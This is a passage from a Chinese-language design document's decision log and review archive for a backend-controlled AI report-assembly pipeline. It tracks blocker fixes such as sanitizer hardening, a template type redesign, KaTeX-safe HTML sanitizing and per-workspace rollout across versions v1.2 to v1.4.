| 2026-05-06 v1.2 | **stateless 强约束 + dimensionId 关联**（B6+B7）                                                       | 反向洞察 #8 跨 thread 污染；partial dim failure 时 index 漂移会让所有后续 dim 错位                                                                                                                                                                         |
| 2026-05-06 v1.2 | **template Slot 抽象，北极星泛化**（架构师 M2）                                                        | deep-research 形态硬编码会让 custom-agents single-agent ReAct 形态返工；现在引入 `ReportTemplate` 接口，DEEP_RESEARCH_TEMPLATE 是默认值，未来可加 single-agent free-form template                                                                          |
| 2026-05-06 v1.2 | **sanitizer 状态机（非奇偶）+ 精确剥 H2 + 16 fixture**（架构师 M1+M5+测试 M1）                         | 嵌套 fence 奇偶失效；剥所有 H2 会破坏 dim 内合法 H2 子章节；16 类 fixture 覆盖 prod 真实 + 测试视角补充姿势                                                                                                                                                |
| 2026-05-06 v1.2 | **安全 4 条 BLOCKER 全部上正面**（C-1 dim.name CRLF / H-1 rehype-sanitize / H-2 ReDoS / H-3 PII 日志） | 架构防御不可缺安全侧；前端 rehype-sanitize 是项目已装包但未挂载，立即补                                                                                                                                                                                    |
| 2026-05-06 v1.2 | **per-workspace 灰度 + sanitizerVersion 持久化**（安全 L-1+L-2）                                       | 全局 flag 切换跨租户 blast radius 太大；规则升级后历史数据需版本兼容                                                                                                                                                                                       |
| 2026-05-06 v1.3 | **ReportTemplate 类型重设计为 discriminated union `bodySource`**（NB-1）                               | v1.2 三处 `as never` cast 是 type lie，编译期不防错；改 `bodySource: { kind: 'fromBodies', field } \| { kind: 'fromBuilder', builder }` 让所有 slot 严格区分。同时改名 `MULTI_DIMENSION_REPORT_TEMPLATE`（中性词，与 single-agent freeform template 对称） |
| 2026-05-06 v1.3 | **MissionContext 显式声明 reportSegments / leaderForeword 字段**（NB-2）                               | 拆 s8-pre/s8-final 后 ctx 共享键不能靠隐式约定；显式声明 + spec 锁 ctx schema                                                                                                                                                                              |
| 2026-05-06 v1.3 | **rehype-sanitize 用 katexAwareSchema 扩展 defaultSchema**（NB-3）                                     | 默认 schema 把 MathML 标签全剥导致 KaTeX 渲染破；仅 allow-list MathML tags + `katex*` className，不放开 script/iframe/style/event handler                                                                                                                  |
| 2026-05-06 v1.3 | **PR-A0 含 reconciliationReport 类型从 string 演进为对象，分阶段迁移 + 兼容分支**（NB-4）              | analyst.agent.ts:121-125 当前对 string 调 `.slice`；扩成对象后旧读路径 runtime 炸；用 `typeof === 'string'` 兼容分支保留 1 release 周期                                                                                                                    |
| 2026-05-06 v1.3 | **拒绝 stepId 命名空间耦合，s8-pre 与 s8-final 使用独立 stepId**（NB-5）                               | dispatcher 按 stepId 字符串匹配 hook，phase 字段无法区分 stage instance；改独立 stepId 与既有命名风格一致                                                                                                                                                  |
| 2026-05-06 v1.3 | **invariant spec 用 expectedSectionCount(template, segments) 辅助函数，参数化 template**（NB-6）       | 硬编码 `+9` 公式仅对 MULTI_DIMENSION 形态成立，SINGLE_AGENT_FREEFORM 跑出错误结果；template-aware 公式让 spec 跨形态可用                                                                                                                                   |
| 2026-05-06 v1.3 | **PR-A5 拆为 A5a/b/c/d 各 ≤1 天**（NB-8）                                                              | 1.5 天对应 5 工种工作（拆 stage / 抽 extractor / ctx 接口扩 / 前端 preview / mission-stage-bindings），实际 3 天；拆四子 PR 单独可上线                                                                                                                     |
| 2026-05-06 v1.3 | **per-workspace 灰度用 DB 表 `feature_flag_workspace_grant`**（MAJOR 详化）                            | Redis Set 不便审计 + 不与 admin UI 集成；DB 表加 `granted_by/expires_at` 字段，admin grant API RBAC 防 IDOR                                                                                                                                                |
| 2026-05-06 v1.3 | **sanitizer 加 `instruction-injection-redacted` 规则到 enum**（MAJOR）                                 | v1.2 §6.4 写 spec 但 enum 未声明，spec 无法执行；规则纳入 enum 让 sanitizer 实现可执行                                                                                                                                                                     |
| 2026-05-06 v1.3 | **report.preview 前端事件契约纳入 baseline**（MAJOR）                                                  | s8-pre emit 新事件需走 contract spec 防 sneak-in；payload schema 显式定义 ≤8KB                                                                                                                                                                             |
| 2026-05-06 v1.3 | **qualityInputs.warnings.dimension → scopeKey**（MAJOR 命名中性化）                                    | dimension 是 deep-research 业务概念，harness DTO 不应携带；scopeKey 让 single-agent freeform 形态也能复用此字段                                                                                                                                            |

---

## 11. 待你审批确认（v1.3 — 二轮 5 路评审 8 NEW BLOCKER + 9 MAJOR 全部修订）

- [ ] **方向**：backend 控结构、LLM 只填内容（无变化）
- [ ] **能力归属**：sanitizer → engine / structural assembler → harness / S8 stage → app；`ReportTemplate` 让 harness 能力跨 deep-research / single-agent freeform 形态泛化（v1.3 类型严格化）
- [ ] **v1.3 NB-1 ReportTemplate 类型重设计**：`bodySource` discriminated union 替换 `bodyFrom + as never`，模板改名 `MULTI_DIMENSION_REPORT_TEMPLATE`
- [ ] **v1.3 NB-2 MissionContext schema 扩展**：reportSegments / leaderForeword 显式字段 + spec 锁
- [ ] **v1.3 NB-3 KaTeX schema**：`katexAwareSchema` 仅 allow-list MathML + `katex*` className
- [ ] **v1.3 NB-4 PR-A0 reconciliationReport schema migration**：含 LLM prompt 更新 + 兼容分支 + 1 release 周期保留
- [ ] **v1.3 NB-5 stepId 独立**：`s8-pre` / `s8-final` 各自 stepId 拒绝 phase 字段耦合
- [ ] **v1.3 NB-6 invariant template-aware**：`expectedSectionCount(template, segments)` 辅助函数 + per-template spec
- [ ] **v1.3 NB-7 sanitizer fixture F17 标题跳跃 + F18 prompt injection**
- [ ] **v1.3 NB-8 PR-A5 拆为 A5a/b/c/d 各 ≤1 天**
- [ ] **v1.3 MAJOR 9 项**：report.preview 契约 / per-workspace 表 / @MaxLength / scopeKey 中性化 / ESLint 实际代码 / sanitizer rule enum / PR-A0/A6 工作量修正 / dump 脚本入清单
- [ ] **v1.3 总工作量**：9.5 天人 + 1 周观察（v1.2 是 7 天，因 schema migration + KaTeX 调试 + PR-A5 拆四子 +2.5 天）
- [ ] **不在范围**：custom agent pipeline / ReconciliationPanel JSON 渲染 / 报告版本化等独立议题（无变化）

**审过后立即开工**：PR-A0（1.5 天解锁后续）+ PR-A7（1 天治标）并行启动。

---

## 12. 评审记录（5 路并行专业评审归档）

### 12.1 评审参与者

| #   | 视角         | Agent            | 评审状态 |
| --- | ------------ | ---------------- | -------- |
| 1   | 架构师       | architect        | ✅ 完成  |
| 2   | 架构合规审计 | arch-auditor     | ✅ 完成  |
| 3   | 代码审查     | reviewer         | ✅ 完成  |
| 4   | 测试覆盖     | tester           | ✅ 完成  |
| 5   | 安全审计     | security-auditor | ✅ 完成  |

### 12.2 BLOCKER 汇总（11 + 1 CRITICAL = 12 项）

| #             | 来源                   | BLOCKER 描述                                             | v1.2 修订位置                                |
| ------------- | ---------------------- | -------------------------------------------------------- | -------------------------------------------- |
| B1            | 架构师 + 代码审        | 段来源字段实证不存在（reconciliationReport.markdown 等） | §1 摘要 + §5 PR-A0                           |
| B2            | 架构师 + 代码审 + 测试 | refill 模式破坏不可变契约                                | §4.3 拆 s8-pre/s8-final                      |
| B3            | 架构师 + 代码审        | sections.length invariant 公式不自洽                     | §2.3 公式统一                                |
| B4            | 架构合规               | ESLint Section 10 锁的是已删除旧路径                     | §5 PR-A0 含路径列表更新                      |
| B5            | 架构合规               | qualityInputs `{ ... }` 空壳                             | §4.2 明确字段 schema                         |
| B6            | 架构合规               | StructuralReportAssembler 未声明 stateless               | §4.2 强约束 + spec                           |
| B7            | 代码审                 | perDimension: string[] index 漂移风险                    | §4.2 改 Array<{dimensionId, body}>           |
| B8            | 测试                   | prod fixture 反推方法未定义 + 断言强度不足               | §6.3 SQL + 多角度断言                        |
| B9 (CRITICAL) | 安全                   | dim.name CRLF / H2 注入                                  | §1 摘要 + §2.3 + §4.2 + §5 PR-A0             |
| B10 (HIGH)    | 安全                   | 前端 ArtifactMarkdown 无 rehype-sanitize                 | §5 PR-A6                                     |
| B11 (HIGH)    | 安全                   | sanitizer ReDoS / DoS 防护缺失                           | §4.1 input size + 非回溯 regex + AbortSignal |
| B12 (HIGH)    | 安全                   | appliedRules.positions 序列化 PII 风险                   | §4.1 删除 positions 字段                     |

### 12.3 MAJOR 汇总（18 项 — 全部已修订进 v1.2）

包含但不限于：

- 架构师 M1 fence 嵌套 → §4.1 状态机
- 架构师 M2 北极星泛化 → §4.2.1 ReportTemplate Slot
- 架构师 M3 quality 子构建抽出 → §5 PR-A3 前置 + §7 风险表
- 架构师 M4 cache hit / rerun → §7 风险表
- 架构师 M5 sanitizer 剥 H2 精确化 → §4.1 仅剥 knownDimNames 首行
- 架构合规 M1 json-fence-parser 移入 markdown/ → §5 PR-A1
- 架构合规 M2 命名规范 .util.ts/.types.ts → §4.1
- 架构合规 M3 sanitizer 异常断路器 → §7 风险表
- 代码审 M1 fallback 错误码分级 → §7 风险表
- 代码审 M2 feature flag 命名空间 + per-workspace → §5 PR-A6 + §7
- 代码审 M3 fence 嵌套 fixture → §4.1 F7+F11
- 代码审 M4 prod fixture 可行性 → §6.3 SQL
- 代码审 M5 S8B remediation 重跑 → §7 风险表 + §6.4 spec
- 代码审 M6 sanitizer metrics 钩子 → §5 PR-A8
- 测试 M1 8 类恶意 fixture → §4.1 16 fixture
- 测试 M2 figures.sectionId 重映射 → §6.4 spec
- 测试 M3 并发共享状态 → §6.4 spec
- 测试 M4 feature flag 状态机 → §6.4 spec
- 安全 M-1 prompt injection 隔离 → §4.1 instruction-injection-redacted 规则 + §7
- 安全 M-2 figures sectionId backend 独占 → §4.2 入口剥离 LLM 内嵌 metadata
- 安全 M-3 thinking signature 剥离 → §4.1 thinking-signature-stripped 规则

### 12.4 MINOR 汇总（14 项）

详见各评审原文 — v1.2 已部分纳入（命名规范 / sanitize fixture 扩 / PR 拆分细化）；剩余项作为 v1.3 候选改进。

### 12.5 评审 → 修订对照矩阵

完整的"评审反馈条 → v1.2 文档章节修订位置"映射存在于 §10 决策日志 + 本节。每条 BLOCKER 都有可追溯的代码位置 / spec 位置 / PR 编号。

---

### 12.6 二轮评审记录（v1.2 → v1.3）

| #   | 视角         | Agent            | 评审状态 | 一轮 finding 真修了吗                    | NEW BLOCKER                                                                                                                                                     |
| --- | ------------ | ---------------- | -------- | ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | 架构师       | architect        | ✅ 完成  | 6 真修 / 2 部分修                        | NB-1 ReportTemplate `as never` type lie；MAJOR：report.preview 契约缺、PR-A5 工作量低估、qualityInputs.dimension biz-name                                       |
| 2   | 架构合规审计 | arch-auditor     | ✅ 完成  | 6 真修 / 2 半修                          | NB-5 stepId 命名空间耦合；NB-1 ReportTemplate type lies；架构债：god-class +1 / shim +2 / biz-name +1                                                           |
| 3   | 代码审查     | reviewer         | ✅ 完成  | 13 项全 ✅                               | NB-2 MissionContext.reportSegments 缺；NB-3 KaTeX schema 破；NB-4 reconciliationReport schema 迁移；工作量：PR-A5 1.5d→2-2.5d / PR-A0 1d→1.5d / PR-A6 1d→1.5-2d |
| 4   | 测试覆盖     | tester           | ✅ 完成  | 7 真修 / 2 可行性低                      | NB-5 stage integration spec 缺；NB-6 ReportTemplate per-template invariant 不兼容；NB-7 16 fixture 漏标题跳跃                                                   |
| 5   | 安全审计     | security-auditor | ✅ 完成  | C-1 PARTIAL / H-1 DEFERRED / M-1 PARTIAL | PR-A0 缺 @MaxLength；sanitizerVersion fingerprinting；per-workspace IDOR；CSP nuance                                                                            |

### 12.7 二轮 NEW BLOCKER 汇总（8 项 — 全部已修订进 v1.3）

| #    | 来源              | NEW BLOCKER 描述                                                          | v1.3 修订位置                                                  |
| ---- | ----------------- | ------------------------------------------------------------------------- | -------------------------------------------------------------- |
| NB-1 | 架构师 + 架构合规 | ReportTemplate `bodyFrom: 'preface' as never` 三处 type lie               | §4.2 discriminated union `bodySource` + §4.2.1 + §10 决策日志  |
| NB-2 | 代码审            | MissionContext 缺 reportSegments / leaderForeword 字段声明                | §4.3 ctx schema 显式声明 + §6.5 spec                           |
| NB-3 | 代码审            | rehype-sanitize 默认 schema 破 KaTeX MathML 渲染                          | §6.6 `katexAwareSchema` + §5 PR-A6 工作量上调                  |
| NB-4 | 代码审            | PR-A0 reconciliationReport schema migration 缺，analyst.agent.ts 读路径炸 | §5.1 PR-A0 详化（兼容分支 + LLM prompt 更新）                  |
| NB-5 | 架构合规 + 测试   | stepId 命名空间耦合 + stage integration spec 缺                           | §4.3 独立 stepId + §6.5 stage-integration spec                 |
| NB-6 | 测试              | invariant spec 公式硬编码 deep-research 形态                              | §6.2 `expectedSectionCount(template, segments)` 辅助函数       |
| NB-7 | 测试 M1 残漏      | 16 fixture 漏 H1→H3 标题跳跃 + prompt injection rule 悬空                 | §4.1 F17 + F18 + rule enum 加 `instruction-injection-redacted` |
| NB-8 | 架构师 + 代码审   | PR-A5 工作量低估 1.5d → 实际 3d                                           | §5 拆 A5a/b/c/d 各 ≤1d                                         |

### 12.8 二轮 MAJOR 汇总（9 项 — 全部已修订进 v1.3）

- report.preview 前端事件契约定义 → §4.3.1
- per-workspace 灰度基础设施明确（DB 表）→ §5.2
- PR-A0 新 DTO 字段补 @MaxLength → §5.1
- 业务名中性化 dimension → scopeKey → §4.2 qualityInputs
- ESLint Section 10 写出实际代码 diff → §5.1 PR-A0
- prompt injection 规则纳入 SanitizeRuleApplied enum → §4.1
- PR-A0 工作量 1d → 1.5d（schema migration）→ §5
- PR-A6 工作量 1d → 1.5-2d（KaTeX + per-workspace 表）→ §5
- dump-playground-fixture.js 列入 PR-A0 文件清单 → §5.1

---

## 13. 迭代日志

| 版本      | 日期       | 主要变更                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | 评审状态                                                         |
| --------- | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| v1.0      | 2026-05-06 | 初稿 — backend 控结构方向 + S8 一次产出 segments 假设                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | 用户三问                                                         |
| v1.1      | 2026-05-06 | 修订 S8 不一次产出，segments 来自既有 stage；增加质量闭环说明 + token 估算表                                                                                                                                                                                                                                                                                                                                                                                                                                                          | 用户接受方向 → 5 路并行评审                                      |
| v1.2      | 2026-05-06 | 一轮 5 路评审 12 BLOCKER + 18 MAJOR 全部修订；新增 PR-A0 字段对齐 + 拆 s8-pre/s8-final + 安全 4 条 BLOCKER 修复 + ReportTemplate 泛化                                                                                                                                                                                                                                                                                                                                                                                                 | 二轮 5 路评审                                                    |
| v1.3      | 2026-05-06 | 二轮 5 路评审 8 NEW BLOCKER + 9 MAJOR 全部修订；ReportTemplate 类型重设计 + ctx schema 显式 + KaTeX schema + reconciliationReport schema migration + PR-A5 拆四子 + per-workspace 表                                                                                                                                                                                                                                                                                                                                                  | 三轮 5 路评审                                                    |
| v1.4      | 2026-05-06 | 三轮 5 路评审 0 NEW BLOCKER（全员"基本收敛"）+ 15 处落地 checklist：KaTeX 补 SVG/path/g + 内部 class allowlist；reconciler 内联 schema 演进 + 抽 types.ts；Zod 改"对象唯一+读取侧 wrap"；fuzzy match 去阈值矛盾；§6.5 buildPriorCtx 真端到端；§6.6 拆 schema 单元 + Playwright DOM；prod fixture commit 进 git；mstyle 属性限制；granted_by NOT NULL + audit log 表；report.preview Zod max() enforce；ESLint 11 规则完整代码；facade 边界声明；recommendations 单源；ReportTemplate.id 常量化                                        | **APPROVED-FOR-IMPLEMENTATION**                                  |
| v1.4-impl | 2026-05-06 | 实现层增量收敛（commit `c238b80f8` v1.7 三轮共识收尾 + 安全审 fix）：fence H2 close lang-aware（`ORPHAN_FENCE_LANGS`：mermaid/无 lang/UML 变体白名单）防止 python/bash 代码块内 `## comment` 误关；F19/F20/F21/F22 spec fixture 锁住启发式（含 `stateDiagram` 大小写命中）；sectionCountMismatch 反向 spec 改用 sanitizer-net-empty 真分歧（删 jest.spyOn ES export）；`recomputeCitationOccurrencesPublic` 直接单测验证 sections[].citations + occurrences 真被回填；doc string 业务名清；`stateDiagram` toLowerCase 大小写 bug 修复 | 4 路 GO（arch 8.5 / tester 9.2 / reviewer 4.5⭐ / security 9.5） |

**收敛标准（"达成共识，满足 Agent 开发要求"）**：

1. 三轮评审无 BLOCKER（v1.3 8 项 NEW BLOCKER 在 v1.3 已修订，三轮主要验证无新引入 BLOCKER）
2. 字段实证 100%（每个 dto 字段引用都能定位到当前代码或 PR-A0 扩展项）
3. 接口签名完整（所有 service/util 函数签名 + 错误处理路径明确，无 `as never` / `as any` cast）
4. ctx schema 显式声明（s8-pre / s8-final / S10 共享键全部命名 + 锁 spec）
5. PR 拆分粒度合理（每 PR 独立可上线 + 工作量 ≤1 天 + 文件清单具体）
6. spec 套件可执行（每条 spec 有明确 fixture + 期望断言 + 不依赖未实现的代码路径）
7. 任意 agent 拿过去能直接写代码而不需要再设计决策

**若三轮评审仍有 BLOCKER → 继续 v1.4 迭代直到收敛**。
